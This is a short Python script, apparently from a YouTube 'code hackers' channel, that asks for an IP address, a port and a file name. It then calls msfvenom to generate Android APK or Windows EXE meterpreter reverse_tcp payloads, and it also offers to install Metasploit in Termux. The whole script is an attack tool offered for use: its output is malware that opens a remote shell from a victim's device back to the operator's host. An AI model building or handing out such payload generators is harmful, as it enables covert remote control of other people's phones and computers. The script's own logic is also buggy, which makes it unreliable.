import os
os.system("clear")
ip = "0"
port = "0"
apk_name = "0"
windows_name = "0"
print("""

 *******      **     **    ** **         *******       **     *******         **      ** **     ** ****     ** ********** ******** *******  
/**////**    ****   //**  ** /**        **/////**     ****   /**////**       /**     /**/**    /**/**/**   /**/////**/// /**///// /**////** 
/**   /**   **//**   //****  /**       **     //**   **//**  /**    /**      /**     /**/**    /**/**//**  /**    /**    /**      /**   /** 
/*******   **  //**   //**   /**      /**      /**  **  //** /**    /**      /**********/**    /**/** //** /**    /**    /******* /*******  
/**////   **********   /**   /**      /**      /** **********/**    /**      /**//////**/**    /**/**  //**/**    /**    /**////  /**///**  
/**      /**//////**   /**   /**      //**     ** /**//////**/**    **       /**     /**/**    /**/**   //****    /**    /**      /**  //** 
/**      /**     /**   /**   /******** //*******  /**     /**/*******        /**     /**//******* /**    //***    /**    /********/**   //**
//       //      //    //    ////////   ///////   //      // ///////         //      //  ///////  //      ///     //     //////// //     // 
""")
print("-----------------------------------------------------------------------------------------------------------------------------------------------------")
print("This tool has benn built by owner of code hackers channel")
print("Here is the link to subscribe the channel https://www.youtube.com/channel/UC9Ugw-UyNYsuHbxfdbzuhmw")
print("-----------------------------------------------------------------------------------------------------------------------------------------------------")
print("This tool is for generating the payloads")
print("Here are platforms to generate the payloads")
print("1.ANDROID")
print("2.WINDOWS")
print("3.INSTALL METASPLOIT ONLY FOR TERMUX(FOR ANDROID 7 AND HIGHER)")
platform = int(input("Enter number "))
def android():
    global ip,port,apk_name
    print("Enter your ip address")
    ip = input()
    print("Enter the port")
    port = input()
    print("Enter the name of apk with .apk extension")
    apk_name = input()
def windows():
    global ip, port, windows_name
    print("Enter your ip address")
    ip = input()
    print("Enter the port")
    port = input()
    print("Enter the name of file with .exe extension")
    windows_name = input()
if platform == 1:
    android()
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" "+"LPORT="+port+" "+"R >"+" "+apk_name)
    print("Your payload have been created")
    print("You can use it with msfconsole")
if platform == 2:
    windows()
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" "+"LPORT="+port+" "+" -f exe -o"+" "+windows_name)
    print("Your payload have been created")
    print("You can use it with msfconsole")
if platform == 3:
    os.system("pkg install unstable-repo && pkg install metasploit")
if platform <= 4:
    print("SORRY THERE IS NO OPTION"," ",platform)